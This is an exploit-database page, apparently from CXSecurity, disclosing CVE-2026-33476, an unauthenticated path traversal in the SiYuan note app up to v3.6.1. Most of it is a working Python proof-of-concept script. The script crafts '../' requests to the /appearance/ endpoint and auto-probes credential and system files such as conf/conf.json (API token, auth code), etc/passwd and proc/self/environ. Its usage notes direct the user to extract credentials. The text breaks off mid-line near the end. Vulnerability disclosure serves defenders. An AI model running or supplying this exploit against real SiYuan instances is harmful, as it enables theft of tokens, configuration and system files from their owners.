---
title: SiYuan < = v3.6.1 Note unauthenticated arbitrary file read (path traversal)
url: https://cxsecurity.com/issue/WLB-2026030033
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-26
fetch_date: 2026-03-27T04:26:44.298705
---

# SiYuan < = v3.6.1 Note unauthenticated arbitrary file read (path traversal)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **SiYuan <= v3.6.1 Note unauthenticated arbitrary file read (path traversal)** **2026.03.26**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-33476](https://cxsecurity.com/cveshow/CVE-2026-33476/ "Click to see CVE-2026-33476")**  CWE: **[CWE-22 (Improper Limitation of a Pathname to a Restricted Directory - Path Traversal), CWE-73 (External Control of File Name or Path)](https://cxsecurity.com/cwe/CWE-22%20%28Improper%20Limitation%20of%20a%20Pathname%20to%20a%20Restricted%20Directory%20-%20Path%20Traversal%29%2C%20CWE-73%20%28External%20Control%20of%20File%20Name%20or%20Path%29 "Click to see CWE-22 (Improper Limitation of a Pathname to a Restricted Directory - Path Traversal), CWE-73 (External Control of File Name or Path)")** | |

#!/usr/bin/env python3
# Exploit Title: SiYuan <= v3.6.1 Note unauthenticated arbitrary file read (path traversal)
# CVE: CVE-2026-33476
# Date: 2026-03-21
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Vendor Homepage: https://b3log.org/siyuan
# Software Link: https://github.com/siyuan-note/siyuan
# Affected: SiYuan <= v3.6.1
# Tested on: SiYuan v3.6.1 (docker / linux)
# Category: Webapps
# Platform: Linux / Windows / macOS
# Exploit Type: Remote File Disclosure
# CVSS: 7.5
# CWE: CWE-22, CWE-73
# Description: Unauthenticated path traversal in /appearance/\* endpoint allows reading arbitrary files
# Fixed in: v3.6.2
# Usage:
# python3 exploit.py <target\_url> --target-file <path>
# python3 exploit.py http://127.0.0.1:6806 --auto
#
# Examples:
# python3 exploit.py http://target:6806 --target-file conf/conf.json
# python3 exploit.py http://target:6806 -f ../../../../etc/passwd --depth 10
#
# Options:
# --target-file Specific file path to attempt to read
# --depth Traversal depth (default: 6)
# --auto Try multiple common sensitive paths automatically
# --timeout Request timeout in seconds (default: 12)
#
# Notes:
# Most useful target: conf/conf.json (contains API token, access auth code, etc.)
# Use --auto mode for broad testing of interesting files
#
# How to Use
# Step 1: Run the script against a vulnerable SiYuan instance
# Step 2: Use --target-file conf/conf.json to extract credentials/config
# Step 3: For system file access try deeper traversal (--depth 8–12)
print(r"""
╔════════════════════════════════════════════════════════════════════════════════════════════╗
║ ║
║ ▄▄▄▄· ▄▄▄ . ▄▄ • ▄▄▄▄▄ ▄▄▄ ▄▄▄· ▄▄▄· ▄▄▄▄▄▄▄▄▄ .▄▄▄ ▄• ▄▌ ║
║ ▐█ ▀█▪▀▄.▀·▐█ ▀ ▪•██ ▪ ▀▄ █·▐█ ▀█ ▐█ ▄█•██ ▀▀▄.▀·▀▄ █·█▪██▌ ║
║ ▐█▀▀█▄▐▀▀▪▄▄█ ▀█ ▐█.▪ ▄█▀▄ ▐▀▀▄ ▄█▀▀█ ██▀· ▐█.▪▐▀▀▪▄▐▀▀▄ █▌▐█· ║
║ ██▄▪▐█▐█▄▄▌▐█▄▪▐█ ▐█▌·▐█▌.▐▌▐█•█▌▐█ ▪▐▌▐█▪·• ▐█▌·▐█▄▄▌▐█•█▌▐█▄█▌ ║
║ ·▀▀▀▀ ▀▀▀ ·▀▀▀▀ ▀▀▀ ▀█▄▀▪.▀ ▀ ▀ ▀ .▀ ▀▀▀ ▀▀▀ .▀ ▀ ▀▀▀ ║
║ ║
║ b a n y a m e r \_ s e c u r i t y ║
║ ║
║ >>> Silent Hunter • Shadow Presence <<< ║
║ ║
║ Operator : Mohammed Idrees Banyamer Jordan 🇯🇴 ║
║ Handle : @banyamer\_security ║
║ ║
║ CVE-2026-33476 • SiYuan arbitrary file read ║
║ ║
╚════════════════════════════════════════════════════════════════════════════════════════════╝
""")
import argparse
import urllib.parse
import requests
import sys
def build\_traversal\_url(base\_url, target\_file, levels=5):
traversal = "../" \* levels
target\_file = target\_file.lstrip("/.").replace("\\", "/")
path = f"{traversal}{target\_file}"
return urllib.parse.urljoin(base\_url.rstrip("/") + "/", f"appearance/{path}")
def try\_read\_file(session, url, timeout=10):
try:
r = session.get(url, timeout=timeout, allow\_redirects=False)
if r.status\_code == 200 and len(r.content) > 0:
try:
return r.text[:4096]
except UnicodeDecodeError:
return f"[Binary content - {len(r.content)} bytes]"
elif r.status\_code in (401, 403):
return None
else:
return f"[Status {r.status\_code}] {r.reason}"
except requests.RequestException as e:
return f"[Error] {str(e)}"
def auto\_exploit(base\_url, max\_levels=10):
common\_targets = [
"conf/conf.json",
"data/conf.json",
"workspace/conf.json",
"data/emojis/README.md",
".siyuan/history.db",
"appearance/themes/README.md",
"etc/passwd",
"proc/self/environ",
"Windows/win.ini",
"Users/Public/Desktop/test.txt",
]
print("[\*] Starting automatic traversal test...\n")
s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (compatible; SiYuan-PoC/1.0)"
for target in common\_targets:
print(f"→ Target: {target}")
found = False
for depth in range(3, max\_levels + 1):
exploit\_url = build\_traversal\_url(base\_url, target, depth)
result = try\_read\_file(s, exploit\_url)
if result is None:
continue
if "[Error]" not in result and "Status" not in result:
print(f" SUCCESS at depth {depth}:")
print(f" URL: {exploit\_url}")
print(f" Content preview:\n{result.rstrip()}\n")
found = True
break
if not found:
print(" Not found in tested depths.\n")
def main():
parser = argparse.ArgumentParser(description="CVE-2026-33476 SiYuan path traversal PoC")
parser.add\_argument("url", help="Base URL of SiYuan instance")
parser.add\_argument("--target-file", "-f", help="Specific file to read")
parser.add\_argument("--depth", "-d", type=int, default=6, help="Traversal depth")
parser.add\_argument("--auto", action="store\_true", help="Try common files automatically")
parser.add\_argument("--timeout", type=int, default=12, help="Request timeout")
args = parser.parse\_args()
base = args.url.rstrip("/")
if not base.startswith(("http://", "https://")):
print("[!] URL must start with http:// or https://")
sys.exit(1)
print(f"[\*] Targeting SiYuan instance: {base}")
print("[\*] CVE-2026-33476 - Unauthenticated Arbitrary File Read PoC\n")
s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0 SiYuan-Test/1.0"})
if args.auto:
auto\_exploit(base, args.depth)
elif args.target\_file:
url = build\_traversal\_url(base, args.target\_file, args.depth)
print(f"[\*] Attempting to read: {args.target\_file}")
print(f" URL: {url}\n")
content = try\_read\_file(s, url, args.timeout)
if content:
print("Result:\n" + "-"\*60)
print(co...